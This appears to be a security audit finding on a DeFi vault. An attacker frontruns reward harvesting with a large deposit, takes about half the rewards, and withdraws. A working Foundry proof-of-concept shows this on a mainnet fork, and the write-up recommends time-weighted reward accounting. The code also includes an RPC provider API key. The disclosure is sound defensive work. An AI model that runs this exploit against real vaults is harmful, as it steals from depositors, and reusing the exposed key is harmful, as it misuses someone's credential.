S-983
Attackers can steal rewards by frontrunning the harvesting of rewards and minting huge amount of vault's shares to reduce the rewards per share.
0xStalin
64
Sufficient
383d ago
Finding description and impact
Impact

Attackers can steal rewards from legitimate users.

Finding Description

When harvesting rewards generated on the vault's strategies, only two things are taken into account when computing the value by which the rewardIndex will grow (rewards per share), which are, the total harvested rewards and the totalSupply of vault shares, nothing more.

The problem with this implementation is that allows attackers to frontrun the harvesting of rewards, and, mint a huge amount of shares to inflate the totalSupply of shares, which will cause that all the harvested rewards to be also distributed for the attacker's freshly minted shares (assets that did not contribute to the generation of the rewards).

There are Protocols that distribute rewards each certain time (epochs), it could be weekly, monthly... Strategies investing on those kind of protocols will be able to harvest those rewards each time they are available.

For example, let's suppose a Strategy that deposits on a protocol where rewards are distributed monthly. Also, assume shares per asset ratio is 1:1 (to faciliate the maths of this example).
Let's suppose the Strategy has deposited 10k USDC on this protocol, and no more deposits were received during the whole epoch.
At the end of the epoch, the strategy generated rewards worth 1k USDC.
Now, the time to harvest the rewards comes. The expected rewards per share would be 0.1 USDC per share, since there are 10k in deposits and 1k of rewards were generated.
But, an attacker frontruns the tx to harvest the rewards and deposits 10k USDC onto the Vault.
Now, the Vault has 20k USDC (therefore, 20k shares). This causes the rewards per share to be 0.05 USDC.
So, rewards are harvested (after the attacker's deposit), and the rewardIndex is updated.
Now, the attacker proceeds to claim rewards and gets away with 500 USDC on rewards his assets did not contributed to generate.
The rest of the original depositors whose assets were used to generate the rewards are left with only 500 rewards to claim (half of the total generated rewards).

On the below PoC is demonstrated the exact same scenario of the previos example.

An attacker deposits a 100% of the existing assets in the Vault right before the rewards are harvested, and, the attacker gets away with ~50% of the generated rewards, leaving the depositors whose assets generated the rewards with only half of the rewards generated thanks to their assets.

pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20, IERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {Clones} from "@openzeppelin/contracts/proxy/Clones.sol";
import {ConcreteMultiStrategyVault} from "../src/vault/ConcreteMultiStrategyVault.sol";
import {Strategy, VaultFees, Allocation, GraduatedFee} from "../src/interfaces/IConcreteMultiStrategyVault.sol";
import {IStrategy} from "../src/interfaces/IStrategy.sol";

import {AaveV3Strategy} from "../src/strategies/Aave/AaveV3Strategy.sol";
import {IAToken, ILendingPool, IProtocolDataProvider, IAaveIncentives} from "../src/strategies/Aave/IAaveV3.sol";

contract HarvestRewardsMessesDepositsPoC is Test {
    using Math for uint256;

    Strategy[] strategies;
    ConcreteMultiStrategyVault vault;

    GraduatedFee[] graduatedFees;
    GraduatedFee[] zeroFees;

    address implementation;

    address feeRecipient = address(0x1111);
    address jimmy = address(0x2222);
    address attacker = address(0x3333);
    address admin = address(0x4444);

    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant rewardToken = 0xC035a7cf15375cE2706766804551791aD035E0C2;
    address public constant LIDO_AaveProtocolDataProvider = 0x08795CFE08C7a81dCDFf482BbAAF474B240f31cD;

    address public constant LIDO_IncentivesRewards = 0x8164Cc65827dcFe994AB23944CBC90e0aa80bFcb;

    address public constant USDC_WHALE = 0x37305B1cD40574E4C5Ce33f8e8306Be057fD7341;

    AaveV3Strategy lido_usdc_AAVE_strategy;

    function setUp() public {
        uint256 forkId = vm.createFork(
            "https://eth-mainnet.g.alchemy.com/v2/THuQ6WJZ6orCusOEvVFb9baHWzk_KG_D",
            21_252_808 // @audit => Date: Nov-23-2024 08:24:35 PM +UTC
        );
        vm.selectFork(forkId);

        vm.label(feeRecipient, "feeRecipient");
        vm.label(jimmy, "jimmy");
        vm.label(attacker, "attacker");
        vm.label(USDC, "USDC");
        // Example performanceFee: [{0000, 500, 300}, {501, 2000, 1000}, {2001, 5000, 2000}, {5001, 10000, 5000}]

        graduatedFees.push(GraduatedFee({lowerBound: 0, upperBound: 500, fee: 300}));
        graduatedFees.push(GraduatedFee({lowerBound: 501, upperBound: 2000, fee: 1000}));
        graduatedFees.push(GraduatedFee({lowerBound: 2001, upperBound: 5000, fee: 2000}));
        graduatedFees.push(GraduatedFee({lowerBound: 5001, upperBound: 10000, fee: 5000}));

        zeroFees.push(GraduatedFee({lowerBound: 0, upperBound: 10000, fee: 0}));

        implementation = address(new ConcreteMultiStrategyVault());
        address vaultAddress = Clones.clone(implementation);
        vault = ConcreteMultiStrategyVault(vaultAddress);

        lido_usdc_AAVE_strategy = new AaveV3Strategy(IERC20(USDC), feeRecipient, admin, 1000, LIDO_AaveProtocolDataProvider, vaultAddress);

        strategies.push(Strategy({
                strategy: IStrategy(address(lido_usdc_AAVE_strategy)),
                allocation: Allocation({index: 0, amount: 10_000}) //100%
        }));

        vault.initialize(
            IERC20(USDC),
            "USDC_AAVEV3STRATEGIES_VAULT",
            "USDC_VAULT",
            strategies,
            feeRecipient,
            VaultFees({depositFee: 0, withdrawalFee: 0, protocolFee: 300, performanceFee: graduatedFees}),
            type(uint256).max,
            admin
        );

        vm.label(address(vault), "vault");
        vm.label(address(lido_usdc_AAVE_strategy), "lidoUSDSStrategy");

    }

    function test_AttackerStealRewardsPoC() public {
      assertEq(strategies[0].strategy.asset(), USDC, "Asset Match");

      (address USDC_lido_aToken, , ) = IProtocolDataProvider(LIDO_AaveProtocolDataProvider).getReserveTokensAddresses(address(USDC));
      uint256 availableLiquidity_USDC_LIDO = IERC20(USDC).balanceOf(address(USDC_lido_aToken));

      address[] memory rewardTokensUSDCPool = IAaveIncentives(LIDO_IncentivesRewards).getRewardsByAsset(USDC_lido_aToken);
      address rewardToken_USDC_lido_aToken = rewardTokensUSDCPool[0];

      assertEq(rewardToken, rewardToken_USDC_lido_aToken);

      uint256 depositAmount = 100_000e6;

      {
        vm.startPrank(USDC_WHALE);
        IERC20(USDC).transfer(jimmy, depositAmount);
        IERC20(USDC).transfer(attacker, depositAmount);
        vm.stopPrank();


        vm.startPrank(jimmy);
        IERC20(USDC).approve(address(vault), depositAmount);
        vault.deposit(depositAmount);
        vm.stopPrank();
      }

      skip(3 days);

      //@audit => Attacker frontruns harvesting rewards to steal half of the rewards
      vm.startPrank(attacker);
      IERC20(USDC).approve(address(vault), depositAmount);
      vault.deposit(depositAmount);
      vm.stopPrank();

      vm.prank(admin);
      vault.harvestRewards("");

      uint256 vaultRewards = IAToken(rewardToken).balanceOf(address(vault));
      console2.log("vaultRewards: ", vaultRewards);

      uint256 attacker_RewardToken_StartBalance = IAToken(rewardToken).balanceOf(attacker);
      assertEq(attacker_RewardToken_StartBalance, 0);

      vm.prank(attacker);
      vault.claimRewards();

      uint256 attacker_RewardToken_FinalBalance = IAToken(rewardToken).balanceOf(attacker);
      assertApproxEqAbs(vaultRewards / 2, attacker_RewardToken_FinalBalance, 1e15);

      //@audit => Attacker withdraws the deposited assets after stealing rewards!
      uint256 attackerMaxRedeem = vault.maxRedeem(attacker);
      vm.prank(attacker);
      vault.redeem(attackerMaxRedeem);
    }
}

Recommended Mitigation Steps

Refactor the logic around harvesting and claiming rewards to make it capable of considering the time since the claimer has been holding the vault shares.
The idea is to distribute equitatively the harvested rewards depending on the proportion by which the claimer's assets contributed for the generation of those rewards.

A common standard use for rewards is the Sushiswap MasterChef contract. Consider refactoring the logic similar to how the MasterChef contract works.

What matters is that time matters when the rewards are distributed, otherwise, this attack vector will allow attackers to mint shares before the harvesting of rewards, and, steal from users whose assets really contributed to the generation of those rewards.
